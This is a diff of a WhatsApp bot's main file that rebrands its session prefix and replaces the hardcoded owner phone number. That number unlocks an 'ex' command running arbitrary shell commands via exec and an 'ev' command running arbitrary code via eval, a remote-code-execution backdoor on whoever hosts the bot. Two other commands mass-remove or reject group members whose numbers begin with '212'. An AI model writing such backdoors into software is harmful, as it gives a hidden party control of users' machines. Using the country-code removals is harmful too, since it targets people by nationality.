@@ -51,7 +51,7 @@ const df = __dirname + '/auth_info_baileys/creds.json';
 
 if (!fs.existsSync(df)) {
   if (config.SESSION_ID) {
-    const sessdata = config.SESSION_ID.replace("KAVIDU-MD=", "");
+    const sessdata = config.SESSION_ID.replace("ASHEN-MD=", "");
 
     if (sessdata.includes("#")) {
       const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
@@ -147,7 +147,7 @@ conn.ev.on('connection.update', async (update) => {
     }
 
     else if (connection === 'open') {
-        console.log("✅ WhatsApp socket connected!");
+        console.log("✅ WhatsApp connected!");
 
         setTimeout(async () => {
             try {
@@ -756,7 +756,7 @@ switch (command) {
   }
     break
     case'ex':{
-      if(senderNumber == 94767054052) {
+      if(senderNumber == 94756194771) {
   const { exec } = require("child_process")
   exec(q, (err, stdout) => {
     if (err) return reply(`-------\n\n` + err)
@@ -768,7 +768,7 @@ switch (command) {
     }
     break
     case'apprv':{
-      if(senderNumber == 94767054052) {
+      if(senderNumber == 94756194771) {
           let reqlist = await conn.groupRequestParticipantsList(from)
           for (let i=0;i<reqlist.length;i++) {
             if(reqlist[i].jid.startsWith("212")){
@@ -789,7 +789,7 @@ switch (command) {
     }
     break
     case'212r':{
-      if(senderNumber == 94767054052) {
+      if(senderNumber == 94756194771) {
         for (let i=0;i<participants.length;i++) {
           if(participants[i].id.startsWith("212")){
        await conn.groupParticipantsUpdate(from, [participants[i].id], 'remove')
@@ -804,7 +804,7 @@ console.log(dsa)
     break
 // Inside your message handler (outside any case)
  case 'ev': {
-    if(senderNumber == 94767054052 || senderNumber == 94722617699) {
+    if(senderNumber == 94756194771 || senderNumber == 94756194771) {
     let code2 = q.replace("°", ".toString()");
     try {
 let resultTest = await eval(code2);
